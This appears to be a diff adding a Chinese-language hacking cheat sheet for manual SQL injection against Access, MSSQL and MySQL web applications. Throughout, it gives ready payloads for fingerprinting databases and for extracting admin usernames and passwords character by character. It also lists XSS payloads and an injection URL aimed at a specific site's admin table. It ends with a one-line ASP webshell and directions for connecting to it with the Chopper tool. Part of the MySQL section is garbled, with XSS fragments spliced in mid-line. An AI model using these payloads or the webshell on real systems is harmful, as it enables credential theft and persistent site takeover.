@@ -1,0 +1,132 @@
+                                          BY面具  QQ83127593
+
+
+
+
+第一步先把IE菜单=>工具=>Internet选项=>高级=>显示友好 HTTP 错误信息前面的勾去掉。否则，不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的提示信息。
+
+数字型：and 1=1 and 1=2 判断是否存在注入
+字符型：' and '1'='1 ' and '1'='2
+搜索型： 关键字%' and 1=1 and '%'='% 关键字%' and 1=2 and '%'='%
+
+IIS报错情况下使用：
+and user>0 （判断是ACCESS还是MSSQL）
+
+不报错则使用各自数据库特性来判断
+and (select count(*) from msysobjects)>0 （返回权限不足access数据库）
+and (select count(*) from sysobjects)>0 （返回正常则为MSSQL数据库）
+
+and db_name（）>0 (返回数据库名)
+and 0<>(select @@version)-- (判断版本信息)
+and db_name（）>0 （返回数据库名）
+
+************注意：猜解之前先要找到后台地址，不然白忙了**********
+ACCESS注入：
+
+猜解表名（正常则存在admin,不正常则不存在）
+and exists (select * from [admin])
+and (Select Count(*) from Admin)>0
+
+猜解字段:（字段username存在则正常，不正常则不存在）
+and (Select username from Admin)>0
+and exists (select username from [admin])
+
+猜解用户名和密码长度
+and (select top 1 len(username) from Admin)>0
+and (select top 1 len(password) from Admin)>0
+原 理：如果top 1的username长度大于0，则条件成立；接着就是>1、>2、>3这样测试下去，一直到条件不成立为止，比如>4成立，>5不成立，就是len(username)=5,即用户名长度为5.得到username的长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码.
+
+猜解用户
+and (select top 1 asc(mid(username,1,1)) from Admin)>0，1，2…,
+当输入到109时，显示错误，而108之前显示正确，说明第一个字符的ASCII码为109.，得到第一个字符是m。
+同理and (select top 1 asc(mid(username,2，1) from Admin)>0，1，2…
+到114的时候不成立，说明第二个字符的ASCII码值为114，字符为r。
+注意的是英文和数字的ASCII码在1-128之间...
+
+
+
+MSSQL注入：
+
+having 1=1-- 【爆出一个表名及字段，如：列 'users.ID' 在选择列表中无效】
+group by users.ID having 1=1--
+group by users.ID, users.username, users.password, users.privs having 1=1--
+; insert into users values( 666, attacker, foobar, 0xffff )-- 【插入新记录】
+
+猜解表名：
+SQL SERVER的每一个数据库都会有用户表和系统表，在系统表sysobjects中，数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在sysobjects表中占一行，那么也就是说当前数据库的表名都会在该表内有存在。我们常用到的参数有三个，name （数据表的名字），xtype（ 数据表的类型 u为用户表），id（ 数据表的对象标志）。
+and (select top 1 name from sysobjects where xtype='u')>0 (得到第一个表名:比如user)
+and (select top 1 name from sysobjects where xtype='u' and name not in ('user'))>0 得到第二个表名，后面的以此类推。。
+
+猜解列名：
+用 到系统自带的2个函数col_name()和object_id()，col_name()的格式是“COL_NAME( table_id , column_id )”，参数table_id是表的标识号，column_id是列的标识号，object_id(admin)就是得到admin在sysobjects 中的标识号，column_id=1,2,3表明admin的第1，2，3列。
+and (select top 1 col_name(object_id('admin'),1) from sysobjects)>0 【得到admin字段的第一个列名“username”依次类推，得到“password”“id”等等】
+
+猜解字段内容：
+and (select top 1 username from [admin])>0 【直接得到用户名】
+and (select top 1 password from [admin])>0 【直接得到密码】
+
+UNION联合查询：
+select name,password,id from user union select user,pwd,uid from 表名
+and 1=1 union select 1,2,3,4,5... from 表名 (数值从1开始慢慢加，如果加到5返回正常，那就存在5个字段)
+
+ASCII逐字解码法：
+
+1、猜解列长度
+and (select top 1 len(列名)from 表名)>N
+其中N是数字，变换这个N的值猜解列长度，当N为6正确，为7错误，则长度为7
+猜解第二条记录就该使用：select top 1 len(列名) from 表名 where 列名 not in (select top 1 列名 from 表名)
+
+2、猜解用户和密码
+ASC()函数和Mid函数,ASC(mid(列名,N,1))得到“列名”第N位字符ASCII码
+猜解语句为：and (select top 1 asc(mid(字段,1,1)) from 数据库名)>ASCII码
+区间判断语句：....between......and......
+中文处理法:当ASCII转换后为“负数”使用abs()函数取绝对值。
+例：and (select top 1 abs(asc(mid(字段,1,1))) from 数据库名)=ASC码
+
+ASCII逐字解码法的应用：
+1、猜解表名：and (select count(*) from admin)<>0
+2、猜解列名：and (select count(列名) from 表名)<>0
+3、猜解用户个数：and (select count(*) from 表名)>1,2.. 2正常，3错误，表中有3条记录。
+4、猜解用户名的长度：and (select len(列名) from 表名)>=1、>=2、>=3、>=4。
+5、猜解用户名：and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0
+最后提交：and (select asc(mid(列名,1,1)) from 表名)=ascii的值
+6、猜解管理员的密码：
+按照上面的原理，把上面的语句中(asc(mid(列名,1,1)的列名换成PASSWORD就能得到密码了。
+
+
+MYSQL+PHP注入：
+1.判断是否存在注入,加';and 1=1 ;and 1=2
+2.判断版本 and ord(mid(version(),1,1))>51 代替。
+
+
+
+
+
+5.判断数据库连接帐号有没有写权限，and (select count(*) from mysql.user)>0 onerror=alert(/xss/) width=150></img> ( 表示注释）
+<img src=vbscript:msgbox ("xss")></img>
+<style> input {left:expression_r (alert('xss'))}</style>
+<div style={left:expression_r (alert('xss'))}></div>
+<div style={left:expression_r (alert('xss'))}></div>
+<div style={left:\0065\0078ression (alert('xss'))}></div>
+html 实体 <div style={left:&#ｘ0065；xpression (alert('xss'))}></div>
+unicode <div style="{left:expression_r (alert('xss'))}">[/post]
+ 
+
+
+
+
+辽宁南方
+NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='
+
+一句话木马"%><%eval(request(chr(35)))%><%'
+密码#
+菜刀连接xx.com/inc/config.asp
+
+
+
+
+手工判断可否注入  
+
+
+and 1=1   正常
+and 1=2   错误
